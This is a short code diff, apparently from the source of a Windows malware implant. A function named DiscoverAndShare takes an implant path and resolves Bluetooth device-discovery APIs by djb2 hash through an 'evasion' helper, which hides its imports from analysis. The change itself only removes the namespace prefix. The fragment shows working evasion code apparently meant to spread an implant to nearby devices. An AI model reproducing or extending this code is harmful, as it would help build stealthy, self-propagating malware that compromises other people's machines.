@@ -22,9 +22,9 @@ bool DiscoverAndShare(const std::string& implantPath) {
     typedef BOOL (WINAPI *pBluetoothFindNextDevice)(HBLUETOOTH_DEVICE_FIND, BLUETOOTH_DEVICE_INFO*);
     typedef BOOL (WINAPI *pBluetoothFindDeviceClose)(HBLUETOOTH_DEVICE_FIND);
 
-    pBluetoothFindFirstDevice pFindFirst = (pBluetoothFindFirstDevice)evasion::getProcByHash(hBt, evasion::djb2Hash("BluetoothFindFirstDevice"));
-    pBluetoothFindNextDevice pFindNext = (pBluetoothFindNextDevice)evasion::getProcByHash(hBt, evasion::djb2Hash("BluetoothFindNextDevice"));
-    pBluetoothFindDeviceClose pFindClose = (pBluetoothFindDeviceClose)evasion::getProcByHash(hBt, evasion::djb2Hash("BluetoothFindDeviceClose"));
+    pBluetoothFindFirstDevice pFindFirst = (pBluetoothFindFirstDevice)getProcByHash(hBt, djb2Hash("BluetoothFindFirstDevice"));
+    pBluetoothFindNextDevice pFindNext = (pBluetoothFindNextDevice)getProcByHash(hBt, djb2Hash("BluetoothFindNextDevice"));
+    pBluetoothFindDeviceClose pFindClose = (pBluetoothFindDeviceClose)getProcByHash(hBt, djb2Hash("BluetoothFindDeviceClose"));
 
     if (!pFindFirst || !pFindNext || !pFindClose) {
         FreeLibrary(hBt);
